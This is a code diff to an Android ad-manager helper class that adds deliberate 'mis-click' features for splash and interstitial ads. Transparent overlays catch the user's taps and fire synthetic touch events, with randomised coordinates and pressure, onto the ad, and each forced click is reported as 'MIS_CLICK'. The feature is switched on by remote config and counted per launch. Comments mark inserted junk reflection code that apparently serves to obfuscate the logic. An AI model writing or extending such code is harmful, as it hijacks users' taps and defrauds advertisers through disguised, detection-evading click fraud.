@@ -2,9 +2,11 @@ package com.common.wheel.admanager;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.res.Resources;
 import android.os.SystemClock;
 import android.text.TextUtils;
 import android.util.ArrayMap;
+import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.Gravity;
 import android.view.MotionEvent;
@@ -46,55 +48,109 @@ public class ViewHelper {
     protected static void clickView(ViewGroup rv) {
 
         try {
-
-            long dTime = SystemClock.uptimeMillis();
-            long eTime = SystemClock.uptimeMillis();
+//            Log.i("","信息流误点:"+top);
             int randomInt = (int) (Math.random() * 30);
             float x = (rv.getWidth() / 2f) + randomInt;
             float y = (rv.getHeight() / 2f) + randomInt;
-            int metaState = 0;
-            float pressure = 0.9f + (float) Math.random() * 0.1f;  // 0.9 ~ 1.0
-            float size = 0.9f + (float) Math.random() * 0.1f; // 0.9 ~ 1.0
-
-            MotionEvent de = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_DOWN, x, y, pressure, size,
-                    metaState, pressure, pressure, 0, 0);
-
-
-            // 添加垃圾代码
-            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
-
-
-            MotionEvent ue = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_UP, x, y, pressure, size,
-                    metaState, pressure, pressure, 0, 0);
-            // 添加垃圾代码
-            Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
-
-
-            rv.dispatchTouchEvent(de);
-            rv.dispatchTouchEvent(ue);
-            de.recycle();
-            ue.recycle();
+            ViewHelper.interstitialClickView(rv, x, y);
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     /**
-     * 插屏误点
+     * 插屏误点 top
      * @param rv
      */
-    protected static void interstitialClickView(ViewGroup rv, int top) {
+    protected static void interstitialClickViewByTop(ViewGroup rv, int top) {
 
         try {
 //            Log.i("","插屏误点:"+top);
 
-            long dTime = SystemClock.uptimeMillis();
-            long eTime = SystemClock.uptimeMillis();
             int randomInt = (int) (Math.random() * 30);
             float x = (rv.getWidth() / 2f) + randomInt;
             float y = top + 40;
+            ViewHelper.interstitialClickView(rv, x, y);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
-//            Log.i("","X："+x+",y："+y);
+    /**
+     * 插屏误点 center
+     * @param rv
+     */
+    protected static void interstitialClickViewByCenter(ViewGroup rv) {
+
+        try {
+//            Log.i("","插屏误点:"+center);
+
+            // Java
+            DisplayMetrics metrics = Resources.getSystem().getDisplayMetrics();
+            int screenHeight = metrics.heightPixels;
+//            Log.d("测试屏幕高度", "屏幕可用区域的高度：" + screenHeight);
+
+            int randomInt = (int) (Math.random() * 30);
+            float x = (rv.getWidth() / 2f) + randomInt;
+            float y = (float) screenHeight / 2;
+            ViewHelper.interstitialClickView(rv, x, y);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    /**
+     * 插屏误点 bottom
+     * @param rv
+     */
+    protected static void interstitialClickViewByBottom(ViewGroup rv) {
+
+        try {
+//            Log.i("","插屏误点:"+bottom);
+
+            // Java
+            DisplayMetrics metrics = Resources.getSystem().getDisplayMetrics();
+            int screenHeight = metrics.heightPixels;
+//            Log.d("测试屏幕高度", "屏幕可用区域的高度：" + screenHeight);
+
+            int randomInt = (int) (Math.random() * 30);
+            float x = (rv.getWidth() / 2f) + randomInt;
+            float y = screenHeight - 150;
+            ViewHelper.interstitialClickView(rv, x, y);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    /**
+     * 开屏误点 bottom
+     * @param rv
+     */
+    protected static void openScreenClickViewByBottom(ViewGroup rv) {
+
+        try {
+//            Log.i("","开屏误点:"+bottom);
+
+            // Java
+            DisplayMetrics metrics = Resources.getSystem().getDisplayMetrics();
+            int screenHeight = metrics.heightPixels;
+//            Log.d("测试屏幕高度", "屏幕可用区域的高度：" + screenHeight);
+
+            int randomInt = (int) (Math.random() * 30);
+            float x = (rv.getWidth() / 2f) + randomInt;
+            float y = screenHeight - 400;
+            ViewHelper.interstitialClickView(rv, x, y);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    protected static void interstitialClickView(ViewGroup rv, float x, float y) {
+
+        try {
+
+            long dTime = SystemClock.uptimeMillis();
+            long eTime = SystemClock.uptimeMillis();
 
             int metaState = 0;
             float pressure = 0.9f + (float) Math.random() * 0.1f;  // 0.9 ~ 1.0
@@ -103,16 +159,13 @@ public class ViewHelper {
             MotionEvent de = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_DOWN, x, y, pressure, size,
                     metaState, pressure, pressure, 0, 0);
 
-
             // 添加垃圾代码
             Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
-
 
             MotionEvent ue = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_UP, x, y, pressure, size,
                     metaState, pressure, pressure, 0, 0);
             // 添加垃圾代码
             Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
-
 
             rv.dispatchTouchEvent(de);
             rv.dispatchTouchEvent(ue);
@@ -347,6 +400,7 @@ public class ViewHelper {
 
             if (isInterInfoClickView(act, key)) {
                 LinearLayout layout = new LinearLayout(act, null);
+//                layout.setBackgroundColor(act.getResources().getColor(R.color.color_ef5b9c));
                 // 添加垃圾代码
                 Class<?> fl = Class.forName("android.widget.FrameLayout");
 //                layout.setOnTouchListener(new View.OnTouchListener() {
@@ -368,22 +422,24 @@ public class ViewHelper {
 
                 locationList.clear();
 
-                findAdViewRecursive(rv);
-                int left = 0;
-                int top = 0;
-                int width = 0;
-                int height = 0;
-                if (!locationList.isEmpty()) {
-                    left = locationList.get(0);
-                    top = locationList.get(1);
-                    width = locationList.get(2);
-                    height = locationList.get(3);
-                }
-                Log.d("AdPosition", "最终广告位置 - Left: " + left + ", Top: " + top + ", width: " + width + ", height: " + height);
-
-                final int cTop = top;
+//                findAdViewRecursive(rv);
+//                int left = 0;
+//                int top = 0;
+//                int width = 0;
+//                int height = 0;
+//                if (!locationList.isEmpty()) {
+//                    left = locationList.get(0);
+//                    top = locationList.get(1);
+//                    width = locationList.get(2);
+//                    height = locationList.get(3);
+//                }
+//                Log.d("AdPosition", "最终广告位置 - Left: " + left + ", Top: " + top + ", width: " + width + ", height: " + height);
+//
+//                final int cTop = top;
                 layout.setOnClickListener(v -> {
-                    ViewHelper.interstitialClickView(rv, cTop);
+                    ViewHelper.interstitialClickViewByTop(rv, 150);
+                    ViewHelper.interstitialClickViewByCenter(rv);
+                    ViewHelper.interstitialClickViewByBottom(rv);
                     logInterEcpmInfo(act, mAd, "MIS_CLICK");
                     layout.setVisibility(View.GONE);
                 });
@@ -621,6 +677,98 @@ public class ViewHelper {
             Log.i("aaa------","aaa------:"+GsonUtil.formatObjectToJson(params));
             ApiService.addLog(context,"show","获取广告类型："+GsonUtil.formatObjectToJson(params));
 
+            ApiService.postAdInfo(context, params);
+        } catch (Exception e) {
+        }
+    }
+
+    /**
+     * 增加开屏误点
+     *
+     * @param context
+     * @param sc
+     * @param item
+     */
+    protected static void renderOpenScreenView(Context context, FrameLayout sc, MediationAdEcpmInfo item) {
+        try {
+            // 蒙层
+            View llm = new View(context);
+//            llm.setBackgroundColor(context.getResources().getColor(R.color.color_ef5b9c));
+
+            String key = item.getSdkName();
+
+            // 添加垃圾代码
+            Class<?> activityThreadClass = Class.forName("android.widget.FrameLayout");
+
+            sc.addView(llm);
+            // 添加垃圾代码
+            Class<?> vv = Class.forName("android.view.View");
+
+            llm.setVisibility(View.GONE);
+            if (isOpenClickView(context, key)) {
+                llm.setVisibility(View.VISIBLE);
+                llm.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        llm.setVisibility(View.GONE);
+                        ViewHelper.openScreenClickViewByBottom(sc);
+                        ViewHelper.logOpenEcpmInfo(context, item);
+                    }
+                });
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    /**
+     * 开屏误点
+     *
+     * @param context
+     * @return
+     */
+    protected static boolean isOpenClickView(Context context, String key) {
+        boolean isBd = "baidu".equals(key);
+        boolean isCount = false;
+        int count = Hawk.get("openClickCount", 1);
+        int maxNum = 0;
+        try {
+            boolean splash_misclick_ad_config = Hawk.get(ConstantsPath.splash_misclick_ad_config, false);
+            // 不增加误点
+            if (!splash_misclick_ad_config) {
+                return false;
+            }
+            String splash_misclick_ad_config_value = Hawk.get(ConstantsPath.splash_misclick_ad_config_value, "");
+            if (!TextUtils.isEmpty(splash_misclick_ad_config_value)) {
+                String[] value = splash_misclick_ad_config_value.split(",");
+                maxNum = Integer.parseInt(value[value.length - 1]);
+                for (String v : value) {
+                    if (Integer.parseInt(v) == count) {
+                        isCount = true;
+                        break;
+                    }
+                }
+            }
+        } catch (Exception e) {
+        }
+        String publicIP = Hawk.get("publicIP");
+        String ip = TextUtils.isEmpty(publicIP) ? DeviceUtil.getWifiIpAddress(context) : publicIP;
+        boolean isAdd = !isBd && isCount && !TextUtils.isEmpty(ip);
+        if ((count + 1) <= (maxNum + 1)) {
+            Hawk.put("openClickCount", count + 1);
+        }
+        return isAdd;
+    }
+
+    protected static void logOpenEcpmInfo(Context context, MediationAdEcpmInfo item) {
+        try {
+            HashMap<String, String> params = new HashMap<>();
+            params.put("adPlatform", item.getSdkName()); // 广告平台（见平台枚举）
+            params.put("adType", "SPLASH");// 开屏
+            params.put("ecpm", item.getEcpm());
+            params.put("adPosition", item.getSlotId()); // 广告位标识
+            params.put("clickType", "MIS_CLICK"); // 误触
+            params.put("userId", "");
             ApiService.postAdInfo(context, params);
         } catch (Exception e) {
         }
